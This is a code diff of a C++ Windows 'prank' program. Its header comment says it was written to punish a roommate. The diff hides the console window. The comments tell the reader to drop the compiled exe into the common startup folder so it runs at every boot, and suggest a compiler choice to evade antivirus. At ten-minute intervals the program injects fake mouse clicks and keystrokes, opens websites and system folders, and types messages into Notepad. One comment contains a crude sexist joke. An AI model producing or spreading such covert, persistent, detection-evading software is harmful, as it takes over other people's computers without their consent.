@@ -1,5 +1,5 @@
 /********************************************
-* If you're here, you should know that      *		
+* If you're here, you should know that      *
 * I'm the author of this code. I wrote it   *
 * because I wanted to punish my roommate    *
 * for touching my computer when I was away  *
@@ -12,17 +12,19 @@
 *					    *
 * If you want to make a joke to your friend *
 * you should compile this file to .exe, and *
-* past it to Win+R ->"shell:common startup" *
+* past it to Win+R ->"shell : common startup" *
 * It will start every time when windows is  *
 * running. If you want to turn this program *
 * off, you have to find it in task menager  *
+*					    *
+* Use codeblocks if you want to be invisible*
+* for Antivirus				    *
 ********************************************/
 
-#define _WIN32_WINNT 0x0500		     			 
-#include "pch.h"			     			
-#include <iostream>			     		       
-#include <windows.h>			     			
-#include <time.h>			     		 
+#define _WIN32_WINNT 0x0500
+#include <iostream>
+#include <windows.h>
+#include <time.h>
 using namespace std;
 int main() {
 	srand(time(NULL));
@@ -30,20 +32,20 @@ int main() {
 	cout << "Pokazane okno" << endl;
 
 	HWND hWnd = GetConsoleWindow();							//Makes my program invisible!
-	//ShowWindow(hWnd, SW_HIDE);
-	ShowWindow( hWnd, SW_SHOW );							//Change if you want to hide terminal
+	ShowWindow(hWnd, SW_HIDE);
+	//ShowWindow(hWnd, SW_SHOW);							//Change if you want to hide terminal
 
 	unsigned short dontDoThisAgain = 1;						//Repeat the jokes? No.
 	unsigned short whichOne = 0;
 	while (GetAsyncKeyState(VK_CONTROL) >= 0 || GetAsyncKeyState(0x59) >= 0)
 	{
-		Sleep(60000*10);			//You can change time (in ms)
+		Sleep(60000 * 10);			//You can change time (in ms)
 		switch (whichOne) {
 		case 0:
 			whichOne = rand() % 24 + 1;
 			cout << whichOne << endl;
 			if (whichOne == dontDoThisAgain) whichOne = 0;	//As I said, don't repeat jokes...
-			
+
 			break;
 		case 1:									//just some right mouse button clicks
 			for (int i = 0; i < 7; i++) {
@@ -54,7 +56,7 @@ int main() {
 			}
 			dontDoThisAgain = 1;
 			whichOne = 0;
-			
+
 			break;
 		case 2:									//just some left mouse button clicks
 			for (int i = 0; i < 7; i++) {
@@ -68,42 +70,42 @@ int main() {
 			break;
 		case 3:									//don't waste your time... learn sth new
 		{
-			ShellExecute(0, 0, L"https://en.wikipedia.org/wiki/Special:Random", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "https://en.wikipedia.org/wiki/Special:Random", 0, 0, SW_SHOW);
 			dontDoThisAgain = 3;
 			whichOne = 0;
 			break;
 		}
 		case 4:
 		{
-			ShellExecute(0, 0, L"https://www.jw.org/en/", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "https://www.jw.org/en/", 0, 0, SW_SHOW);
 			dontDoThisAgain = 4;
 			whichOne = 0;
 			break;
 		}
 		case 5:									//theory of conspiracy
 		{
-			ShellExecute(0, 0, L"https://www.jasnastronamocy.info/", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "https://www.jasnastronamocy.info/", 0, 0, SW_SHOW);
 			dontDoThisAgain = 5;
 			whichOne = 0;
 			break;
 		}
 		case 6:									//Hello darkness... My old friend
 		{
-			ShellExecute(0, 0, L"https://www.youtube.com/watch?v=4zLfCnGVeL4", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "https://www.youtube.com/watch?v=4zLfCnGVeL4", 0, 0, SW_SHOW);
 			dontDoThisAgain = 6;
 			whichOne = 0;
 			break;
 		}
 		case 7:									//Alternative medicine is a thing,
 		{									//you should try Vitamin C treatment
-			ShellExecute(0, 0, L"http://jerzyzieba.com/", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "http://jerzyzieba.com/", 0, 0, SW_SHOW);
 			dontDoThisAgain = 7;
 			whichOne = 0;
 			break;
 		}
 		case 8:									//The Earth is flat... Like your sister's chest :O
 		{
-			ShellExecute(0, 0, L"http://forumplaskaziemia.pl/forumdisplay.php?fid=11", 0, 0, SW_SHOW);
+			ShellExecute(0, 0, "http://forumplaskaziemia.pl/forumdisplay.php?fid=11", 0, 0, SW_SHOW);
 			dontDoThisAgain = 8;
 			whichOne = 0;
 			break;
@@ -114,17 +116,17 @@ int main() {
 			whichOne = 0;
 			break;
 		case 10:
-			ShellExecute(NULL, NULL, L"C:\\Windows", NULL, NULL, SW_SHOWNORMAL);
+			ShellExecute(NULL, NULL, "C:\\Windows", NULL, NULL, SW_SHOWNORMAL);
 			dontDoThisAgain = 10;
 			whichOne = 0;
 			break;
 		case 11:
-			ShellExecute(NULL, NULL, L"C:\\Program Files", NULL, NULL, SW_SHOWNORMAL);
+			ShellExecute(NULL, NULL, "C:\\Program Files", NULL, NULL, SW_SHOWNORMAL);
 			dontDoThisAgain = 11;
 			whichOne = 0;
 			break;
 		case 12:								//Everyone has got Adobe
-			ShellExecute(NULL, NULL, L"C:\\Program Files (x86)\\Adobe", NULL, NULL, SW_SHOWNORMAL);
+			ShellExecute(NULL, NULL, "C:\\Program Files (x86)\\Adobe", NULL, NULL, SW_SHOWNORMAL);
 			dontDoThisAgain = 12;
 			whichOne = 0;
 			break;
@@ -164,7 +166,7 @@ int main() {
 			whichOne = 0;
 			break;
 		case 19:								//"I think something is wrong" - notepad said...
-			{
+		{
 			system("start notepad.exe");
 			Sleep(600);
 			char tab[27] = "I THINK SOMETHING IS WRONG";
@@ -185,10 +187,10 @@ int main() {
 			Sleep(100);
 			keybd_event(VK_RETURN, 0, 0, 0);
 			Sleep(1000);
-			}
-			dontDoThisAgain = 19;
-			whichOne = 0;
-			break;
+		}
+		dontDoThisAgain = 19;
+		whichOne = 0;
+		break;
 		case 20:								//alt + tab
 			keybd_event(VK_MENU, 0, 0, 0);
 			keybd_event(VK_TAB, 0, 0, 0);
@@ -212,7 +214,7 @@ int main() {
 			dontDoThisAgain = 22;
 			whichOne = 0;
 			break;
-		case 23:								//Shake keyboard							
+		case 23:								//Shake keyboard
 			int Char;
 			while (!GetAsyncKeyState(VK_DELETE))
 			{
@@ -312,7 +314,7 @@ int main() {
 		break;
 		case 25:
 			cout << "This time you're lucky cause I've done nothing so keep your eyes wide open..." << endl;
-			
+
 			dontDoThisAgain = 25;
 			whichOne = 0;
 			break;
